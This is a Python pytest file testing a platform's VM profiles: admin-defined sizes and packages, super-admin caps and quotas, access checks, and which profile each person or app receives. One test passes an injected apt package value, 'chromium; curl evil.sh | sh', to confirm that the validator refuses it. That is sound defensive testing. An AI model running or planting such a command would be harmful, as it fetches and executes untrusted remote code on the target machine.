"""VM profiles: an org admin defines them and gives one to each group and app; the platform caps them.

A person's VM gets their one group's profile; an app's VM its own; a
group or app with none gets the organisation's default. The gateway reads
each producer's profile from its row on the producers feed, with a version
that changes whenever anything in it does (`docs/service-identity.md`
§11.3, §12).
"""

from __future__ import annotations

import pytest

from app.api.base_v1.schema.vm_profiles import PlatformVmCapsBody, VmProfileSettings
from app.config import CloudVmConfig, settings
from app.services.cloud.vm_profiles import VmCaps, VmDefaults
from tests.cloud_world import CloudOrg, make_super_admin, platform

pytestmark = pytest.mark.anyio

BROWSER = {
    'name': 'Browser',
    'memory_mib': 4096,
    'vcpus': 2,
    'idle_before_pause_s': 600,
    'packages': {'apt': ['chromium'], 'pip': ['playwright==1.49.0'], 'npm': ['@playwright/test']},
    'setup_script': 'playwright install-deps',
}


@pytest.fixture
async def acme(client) -> CloudOrg:
    return await CloudOrg(client).create()


def _profiles(acme: CloudOrg) -> str:
    return f'/portal/orgs/{acme.org_id}/vm-profiles'


async def _create(client, acme: CloudOrg, body: dict) -> dict:
    response = await client.post(_profiles(acme), json=body, headers=acme.admin)
    assert response.status_code == 201, response.text
    return response.json()


async def _served(client, gateway, kind: str, producer_id: str) -> dict:
    """The producer's latest row on the gateway's feed: the profile its VM gets, with that profile's versions."""
    response = await client.get('/platform/producers', params={'limit': 1000}, headers=gateway)
    assert response.status_code == 200, response.text
    rows = [row for row in response.json()['producers'] if row['producer'] == {'kind': kind, 'id': producer_id}]
    return dict(rows[-1])


class TestDefining:
    async def test_every_organisation_has_a_default(self, client, acme):
        overview = (await client.get(_profiles(acme), headers=acme.admin)).json()

        [default] = overview['profiles']
        assert default['is_default'] is True
        assert overview['default_profile_id'] == default['id']
        assert (default['memory_mib'], default['normal_memory_mib']) == (4096, 1024)
        assert (default['vcpus'], default['idle_before_pause_s']) == (1, 10)
        assert overview['caps']['max_memory_mib'] == 8192
        assert overview['quota']['awake_vm_seconds_per_month'] is None
        assert overview['quota']['enforced'] is False

    async def test_an_org_admin_defines_one(self, client, acme):
        profile = await _create(client, acme, BROWSER)

        assert profile['packages']['apt'] == ['chromium']
        assert profile['within_caps'] is True
        assert len(profile['version']) == 32

    async def test_never_suspending_is_allowed_only_without_a_longest_idle(self, client, acme):
        refused = await client.post(_profiles(acme), json={**BROWSER, 'idle_before_pause_s': None}, headers=acme.admin)

        assert refused.status_code == 400
        assert '3600' in refused.json()['detail']

    async def test_a_profile_over_the_caps_is_refused(self, client, acme):
        response = await client.post(_profiles(acme), json={**BROWSER, 'memory_mib': 65536}, headers=acme.admin)

        assert response.status_code == 400

    async def test_the_normal_size_fits_in_the_most_a_vm_may_have(self, client, acme):
        too_big = await client.post(
            _profiles(acme), json={**BROWSER, 'memory_mib': 2048, 'normal_memory_mib': 3072}, headers=acme.admin
        )
        small = await _create(client, acme, {**BROWSER, 'name': 'Small', 'memory_mib': 2048, 'normal_memory_mib': 512})

        assert too_big.status_code == 422
        assert (small['memory_mib'], small['normal_memory_mib']) == (2048, 512)

    async def test_expected_memory_is_the_nodes_rule_unless_a_profile_names_it(self, client, acme):
        named = await _create(client, acme, {**BROWSER, 'name': 'Named', 'expected_memory_mib': 1536})
        unnamed = await _create(client, acme, BROWSER)
        too_big = await client.post(
            _profiles(acme), json={**BROWSER, 'name': 'Big', 'expected_memory_mib': 8192}, headers=acme.admin
        )

        assert (named['expected_memory_mib'], unnamed['expected_memory_mib']) == (1536, None)
        assert too_big.status_code == 422

    async def test_the_deployment_sets_the_standard_profile_and_the_caps(self, monkeypatch):
        monkeypatch.setattr(
            settings,
            'cloud_vm',
            CloudVmConfig(standard_memory_mib=2048, standard_normal_memory_mib=512, standard_vcpus=2, cap_max_vcpus=8),
        )

        standard = VmDefaults.standard()
        caps = VmDefaults.caps()

        assert (standard.name, standard.memory_mib, standard.normal_memory_mib, standard.vcpus) == (
            'Standard',
            2048,
            512,
            2,
        )
        assert (standard.idle_before_pause_s, standard.volume_gib, standard.volume_max_gib) == (10, 10, 50)
        assert (caps.max_memory_mib, caps.max_vcpus, caps.max_idle_before_pause_s, caps.max_volume_gib) == (
            8192,
            8,
            3600,
            200,
        )

    async def test_a_package_that_is_a_shell_line_is_refused(self, client, acme):
        body = {**BROWSER, 'packages': {'apt': ['chromium; curl evil.sh | sh']}}

        assert (await client.post(_profiles(acme), json=body, headers=acme.admin)).status_code == 422

    async def test_names_are_unique(self, client, acme):
        await _create(client, acme, BROWSER)

        assert (await client.post(_profiles(acme), json=BROWSER, headers=acme.admin)).status_code == 409

    async def test_the_default_cannot_be_deleted_and_others_can(self, client, acme):
        overview = (await client.get(_profiles(acme), headers=acme.admin)).json()
        browser = await _create(client, acme, BROWSER)

        default = await client.delete(f'{_profiles(acme)}/{overview["default_profile_id"]}', headers=acme.admin)
        other = await client.delete(f'{_profiles(acme)}/{browser["id"]}', headers=acme.admin)

        assert default.status_code == 409
        assert other.status_code == 204

    async def test_a_member_cannot_and_another_organisations_admin_cannot(self, client, acme):
        _, member = await acme.person('max@acme.com')
        globex = await CloudOrg(client, slug='globex').create()

        assert (await client.get(_profiles(acme), headers=member)).status_code == 403
        assert (await client.get(_profiles(acme), headers=globex.admin)).status_code == 403

    async def test_the_super_admin_defines_and_assigns_in_any_organisation(self, client, acme):
        boss = await CloudOrg(client, slug='boss').create()
        await make_super_admin(boss.admin_id)
        legal = await acme.group('Legal')

        profile = (await client.post(_profiles(acme), json=BROWSER, headers=boss.admin)).json()
        assigned = await client.put(
            f'/portal/orgs/{acme.org_id}/groups/{legal}/vm-profile',
            json={'profile_id': profile['id']},
            headers=boss.admin,
        )

        assert assigned.status_code == 204


class TestCapsAndQuota:
    async def test_only_the_super_admin_sets_caps(self, client, acme):
        caps = {'max_memory_mib': 16384, 'max_vcpus': 8, 'max_idle_before_pause_s': None}

        assert (await client.put('/portal/vm-caps', json=caps, headers=acme.admin)).status_code == 403
        await make_super_admin(acme.admin_id)
        assert (await client.put('/portal/vm-caps', json=caps, headers=acme.admin)).json()['max_vcpus'] == 8
        never = await client.post(_profiles(acme), json={**BROWSER, 'idle_before_pause_s': None}, headers=acme.admin)
        assert never.status_code == 201

    async def test_lowering_a_cap_clamps_what_is_served(self, client, acme):
        browser = await _create(client, acme, BROWSER)
        app = await acme.app()
        await client.put(
            f'/portal/orgs/{acme.org_id}/apps/{app.client_id}/vm-profile',
            json={'profile_id': browser['id']},
            headers=acme.admin,
        )
        gateway = await platform(client)
        before = await _served(client, gateway, 'app', app.client_id)
        await make_super_admin(acme.admin_id)
        await client.put(
            '/portal/vm-caps',
            json={'max_memory_mib': 1024, 'max_vcpus': 1, 'max_idle_before_pause_s': 60},
            headers=acme.admin,
        )

        after = await _served(client, gateway, 'app', app.client_id)
        listed = (await client.get(_profiles(acme), headers=acme.admin)).json()['profiles']

        served = after['profile']
        assert (served['memory_mib'], served['vcpus'], served['idle_before_pause_s']) == (1024, 1, 60)
        assert (before['profile']['normal_memory_mib'], served['normal_memory_mib']) == (1024, 1024)
        assert after['profile_version'] != before['profile_version']
        assert [p['within_caps'] for p in listed if p['id'] == browser['id']] == [False]

    async def test_a_lowered_cap_clamps_the_normal_size_and_expected_use_too(self):
        profile = VmProfileSettings(
            name='Big', memory_mib=8192, normal_memory_mib=2048, expected_memory_mib=4096, vcpus=2
        )
        caps = PlatformVmCapsBody(max_memory_mib=1536, max_vcpus=4)

        served = VmCaps.clamped(profile, caps)

        assert (served.memory_mib, served.normal_memory_mib, served.expected_memory_mib) == (1536, 1536, 1536)

    async def test_the_super_admin_sets_an_organisations_quota(self, client, acme):
        quota = f'/portal/orgs/{acme.org_id}/vm-quota'

        assert (
            await client.put(quota, json={'awake_vm_seconds_per_month': 100}, headers=acme.admin)
        ).status_code == 403
        await make_super_admin(acme.admin_id)
        stored = await client.put(quota, json={'awake_vm_seconds_per_month': 360000}, headers=acme.admin)

        assert stored.json()['awake_vm_seconds_per_month'] == 360000
        assert (await client.get(quota, headers=acme.admin)).json()['enforced'] is False


class TestTheProfileAProducerGets:
    async def test_a_person_gets_their_groups_and_an_app_its_own(self, client, acme):
        browser = await _create(client, acme, BROWSER)
        legal = await acme.group('Legal')
        ada, _ = await acme.person('ada@acme.com', legal)
        max_id, _ = await acme.person('max@acme.com')
        app = await acme.app()
        gateway = await platform(client)
        await client.put(
            f'/portal/orgs/{acme.org_id}/groups/{legal}/vm-profile',
            json={'profile_id': browser['id']},
            headers=acme.admin,
        )

        hers = (await _served(client, gateway, 'person', ada))['profile']
        his = (await _served(client, gateway, 'person', max_id))['profile']
        its = (await _served(client, gateway, 'app', app.client_id))['profile']

        assert (hers['profile_name'], hers['memory_mib'], hers['packages']['apt']) == ('Browser', 4096, ['chromium'])
        assert (hers['normal_memory_mib'], his['memory_mib'], his['normal_memory_mib']) == (1024, 4096, 1024)
        assert 'drop_caches_before_suspend' not in hers and hers['expected_memory_mib'] is None
        assert his['profile_name'] == 'Standard'
        assert its['profile_name'] == 'Standard'

    async def test_the_version_changes_with_anything_and_the_packages_version_with_the_packages(self, client, acme):
        browser = await _create(client, acme, BROWSER)
        app = await acme.app()
        await client.put(
            f'/portal/orgs/{acme.org_id}/apps/{app.client_id}/vm-profile',
            json={'profile_id': browser['id']},
            headers=acme.admin,
        )
        gateway = await platform(client)
        first = await _served(client, gateway, 'app', app.client_id)

        await client.put(f'{_profiles(acme)}/{browser["id"]}', json={**BROWSER, 'vcpus': 1}, headers=acme.admin)
        changed = await _served(client, gateway, 'app', app.client_id)
        await client.put(
            f'{_profiles(acme)}/{browser["id"]}',
            json={**BROWSER, 'vcpus': 1, 'packages': {'apt': ['chromium', 'ffmpeg']}},
            headers=acme.admin,
        )
        repackaged = await _served(client, gateway, 'app', app.client_id)

        assert changed['profile_version'] != first['profile_version']
        assert changed['packages_version'] == first['packages_version']
        assert repackaged['packages_version'] != changed['packages_version']

    async def test_deleting_a_profile_puts_its_groups_back_on_the_default(self, client, acme):
        browser = await _create(client, acme, BROWSER)
        legal = await acme.group('Legal')
        ada, _ = await acme.person('ada@acme.com', legal)
        await client.put(
            f'/portal/orgs/{acme.org_id}/groups/{legal}/vm-profile',
            json={'profile_id': browser['id']},
            headers=acme.admin,
        )

        await client.delete(f'{_profiles(acme)}/{browser["id"]}', headers=acme.admin)

        gateway = await platform(client)
        assert (await _served(client, gateway, 'person', ada))['profile']['profile_name'] == 'Standard'

    async def test_copying_a_group_copies_its_profile(self, client, acme):
        browser = await _create(client, acme, BROWSER)
        legal = await acme.group('Legal')
        await client.put(
            f'/portal/orgs/{acme.org_id}/groups/{legal}/vm-profile',
            json={'profile_id': browser['id']},
            headers=acme.admin,
        )

        copy = (await client.post(f'/portal/groups/{legal}/copy', json={'name': 'Legal 2'}, headers=acme.admin)).json()

        groups = (await client.get(_profiles(acme), headers=acme.admin)).json()['groups']
        assert [g['vm_profile_id'] for g in groups if g['id'] == copy['id']] == [browser['id']]
